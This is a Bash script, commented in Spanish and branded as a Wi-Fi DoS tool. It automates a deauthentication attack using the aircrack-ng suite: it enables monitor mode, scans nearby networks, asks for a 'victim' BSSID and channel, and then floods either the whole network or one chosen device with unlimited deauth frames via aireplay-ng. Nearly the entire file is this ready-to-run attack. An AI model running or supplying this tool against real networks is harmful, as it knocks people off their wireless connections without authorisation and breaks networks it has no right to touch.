#!/bin/bash

# Colores
rojo='\033[1;31m'
verde='\033[1;32m'
azul='\033[1;34m'
reset='\033[0m'


# Algunas funciones necesarias y banner
check_error(){
  if [ $? -ne 0 ]; then
    echo -e "[${rojo}-${reset}] ${rojo}Hubo un error al ejecutar el comando${reset}"
    exit 1
  fi
}

error(){
  echo -e "[${rojo}-${reset}] ${rojo}Hubo un error${reset}"
  exit 1
}

if [[ $(id -u) != 0 ]]; then
  echo -e "[${rojo}-${reset}] ${rojo}Ejecute el script como root${reset}"
  exit 1
else
  echo -e "${azul}    ██╗    ██╗██╗███████╗██╗      ██████╗  ██████╗ ███████╗
    ██║    ██║██║██╔════╝██║      ██╔══██╗██╔═══██╗██╔════╝
    ██║ █╗ ██║██║█████╗  ██║█████╗██║  ██║██║   ██║███████╗
    ██║███╗██║██║██╔══╝  ██║╚════╝██║  ██║██║   ██║╚════██║
    ╚███╔███╔╝██║██║     ██║      ██████╔╝╚██████╔╝███████║
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝${reset}"
  echo -e "${rojo}Instagram: ${verde}macim0_${reset}"
  sleep 2
  clear
fi

check_bin(){

  if ! command -v $1 > /dev/null 2>&1; then
    echo -e "[${rojo}-${reset}] ${rojo}El binario ${verde}$1 ${rojo}no se encuentra disponible o no está instalado${reset}"
    exit 1
  fi
}

check_bin "aircrack-ng"


# Informacion necesaria para el funcionamiento
echo -e "[${verde}+${reset}] ${rojo}Tarjetas disponibles en su sistema: \n $(cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' ')${reset}"

echo -ne "[${verde}+${reset}] ${verde}Introduce el nombre de tu tarjeta de red: ${reset}"
read tarjeta

# Modo monitor
airmon-ng start $tarjeta > /dev/null 2>&1
check_error
echo -e "[${verde}+${reset}] ${verde}Modo monitor activado con éxito en la tarjeta ($tarjeta)${reset}"

tarjetaMON=$(cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' ' | grep $tarjeta)

# Funcion para salir y desactivar el modo monitor
exit_mon(){
  echo -e "[${rojo}-${reset}] ${rojo}Saliendo....${reset}"
  airmon-ng stop $tarjetaMON > /dev/null 2>&1
  check_error
  echo -e "[${verde}+${reset}] ${verde}Modo monitor deshabilitado con éxito${reset}"
  exit 1
}



# Escaneo y ataque
if ! airodump-ng --band abg $tarjetaMON; then
  exit_mon
fi



echo -ne "[${verde}+${reset}] ${verde}Introduce el BSSID de la red victima: ${reset}"
read bssid
echo -ne "[${verde}+${reset}] ${verde}Escriba el channel de la red: ${reset}"
read channel

if ! airodump-ng --band abg --bssid $bssid -c $channel $tarjetaMON; then
  exit_mon
fi

echo -ne "[${rojo}?${reset}] ${rojo}Desea atacar toda la red o solo un dispositivo ('r' o 'd'): ${reset}"
read rd

trap exit_mon SIGINT

if [[ "$rd" == "r" ]]; then
  echo -e "[${verde}+${reset}] ${azul}Atacando...${reset}"
  aireplay-ng -0 0 -a $bssid $tarjetaMON > /dev/null 2>&1
elif [[ "$rd" == "d" ]]; then
  echo -ne "[${verde}+${reset}] ${verde}Escriba la station del dispositivo: ${reset}"
  read station
  echo -e "[${verde}+${reset}]${azul}Atacando...${reset}"
  aireplay-ng -0 0 -a $bssid -c $station $tarjetaMON > /dev/null 2>&1
fi
